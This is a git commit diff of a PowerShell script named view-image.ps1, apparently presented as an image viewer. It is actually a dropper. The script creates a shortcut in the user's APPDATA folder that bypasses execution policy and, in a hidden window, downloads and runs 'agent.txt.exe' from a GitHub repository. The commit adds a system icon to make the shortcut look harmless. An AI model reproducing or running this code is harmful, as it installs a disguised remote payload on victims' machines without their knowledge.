2804ce4aa6f51051cd6ad9bc3bdc8370d9152848
MohamedAbderraouf <77074550+MohamedAbderraouf@users.noreply.github.com>
2025-03-19 10:13:35 +0100

    Update view-image.ps1

--- view-image.ps1
+++ view-image.ps1
@@ -2,5 +2,6 @@ $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\installer.lnk")                    
 $Shortcut.TargetPath = "powershell.exe"                                                                              
 $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& { Invoke-WebRequest -Uri 'https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/agent.txt.exe' -OutFile `"$env:APPDATA\agent.txt.exe`"; Start-Process -FilePath '%APPDATA%\agent.txt.exe' -WindowStyle Hidden }`""                                                                    
-$Shortcut.WorkingDirectory = "$env:APPDATA"                                                                         
+$Shortcut.WorkingDirectory = "$env:APPDATA"     
+$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,70"
 $Shortcut.Save()       
